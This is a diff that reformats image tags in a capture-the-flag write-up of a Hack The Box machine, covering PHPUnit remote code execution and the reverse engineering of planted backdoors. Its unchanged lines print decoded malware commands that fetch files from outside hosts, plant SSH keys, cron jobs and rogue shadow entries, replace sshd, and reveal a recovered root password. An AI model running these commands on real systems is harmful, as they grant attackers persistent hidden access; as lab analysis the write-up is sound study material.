@@ -19,15 +19,15 @@ PORT   STATE SERVICE
 
 The website is a company page:
 
-<figure><img src="../../../.gitbook/assets/image (630).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(630).png>)
 
 If we try to Visit Store, we get redirected to `store.djewelry.htb`. The store page is identical to the original, but it has more functionalities:
 
-<figure><img src="../../../.gitbook/assets/image (1927).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1927).png>)
 
 I tried adding products to the cart and maybe finding an exploit pertaining to that, but it was disabled.
 
-<figure><img src="../../../.gitbook/assets/image (2444).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2444).png>)
 
 Since there's no functionalities on this site, let's run a `feroxbuster` directory scan.
 
@@ -62,7 +62,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 When we view the `/vendor` endpoint, we see a file system with different PHP libraries:
 
-<figure><img src="../../../.gitbook/assets/image (3572).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3572).png>)
 
 Searching for exploits for each of them leads me an RCE for PHPUnit:
 
@@ -70,11 +70,11 @@ Searching for exploits for each of them leads me an RCE for PHPUnit:
 
 This works:
 
-<figure><img src="../../../.gitbook/assets/image (2716).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2716).png>)
 
 Then, use a `bash` one-liner to get a reverse shell.
 
-<figure><img src="../../../.gitbook/assets/image (3242).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3242).png>)
 
 ## Privilege Escalation
 
@@ -93,34 +93,30 @@ drwxr-xr-x 13 root     root      4096 Feb  8  2022 ..
 
 This file was an ELF binary:
 
-{% code overflow="wrap" %}
 ```
 www-data@production:/var/backups$ file info
 info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped
 ```
-{% endcode %}
 
 We can transfer this back to my machine for some reverse engineering via `ghidra`. There were loads of functions within the binary.
 
 There are a lot of functions within this function:
 
-<figure><img src="../../../.gitbook/assets/image (3774).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3774).png>)
 
 Out of all the functions, `exec_shell` is the most unique because it actually executes something.
 
-<figure><img src="../../../.gitbook/assets/image (1565).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1565).png>)
 
 We can see the `-c` flag, and it is passed to `execve`, which means that some commands are being executed here. However, `ghidra` is unable to to see what is being executed. When we open it up in `ida64`, we can see a huge chunk of hex.
 
-<figure><img src="../../../.gitbook/assets/image (1281).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1281).png>)
 
 When converted to a string, it gives this:
 
-{% code overflow="wrap" %}
 ```
 wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;
 ```
-{% endcode %}
 
 We can tidy this up a bit:
 
@@ -156,15 +152,14 @@ Session completed.
 
 Reading the code, it seems to make the user `$user"1"`, which means it is `steven1` in this case. We can then `ssh` in as `steven1` using this password:
 
-<figure><img src="../../../.gitbook/assets/image (1437).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1437).png>)
 
 ### Mod\_Reader.o RE
 
 Running LinPEAS reveals there is mail for the user:
 
-<figure><img src="../../../.gitbook/assets/image (3810).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3810).png>)
 
-{% code overflow="wrap" %}
 ```
 steven@production:~$ cat /var/mail/steven
 From root@production  Sun, 25 Jul 2021 10:31:12 GMT
@@ -191,7 +186,6 @@ will generate a temporary password for you to authenticate to the temporary serv
 Thanks,
 sysadmin
 ```
-{% endcode %}
 
 Apache service is weird and there's a database basically. We can head to `/etc/apache2` to enumerate more. I was looking through the files and found a particualrly large file in `mods-available` that had the latest edit date:
 
@@ -209,19 +203,17 @@ The rest of the files were about 500 bytes, meanwhile this thing was massive. We
 
 Then, using `ida64`, we see that there are base64 related functions for this:
 
-<figure><img src="../../../.gitbook/assets/image (448).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(448).png>)
 
 We can locate the string and see that it is being passed into another `bash -c` command:
 
-<figure><img src="../../../.gitbook/assets/image (1729).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1729).png>)
 
 When decoded, it shows this:
 
-{% code overflow="wrap" %}
 ```bash
 wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
 ```
-{% endcode %}
 
 `sshd` is in use here, so let's download that binary back to our machine since RE seems to be the path forward in this machine.
 
@@ -229,7 +221,7 @@ wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /u
 
 This was a much larger binary, so let's use `ghidra` to get some pseudocode. When looking through the functions, we can see that the `auth_password` function is a backdoor.
 
-<figure><img src="../../../.gitbook/assets/image (3115).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3115).png>)
 
 This might contain the credentials for `root`.
 
@@ -297,4 +289,4 @@ Afterwards, we just need to convert this to a string, XOR it with `0x96`, then r
 
 This would give us the string `@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3`, which is the `root` password:
 
-<figure><img src="../../../.gitbook/assets/image (2001).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2001).png>)
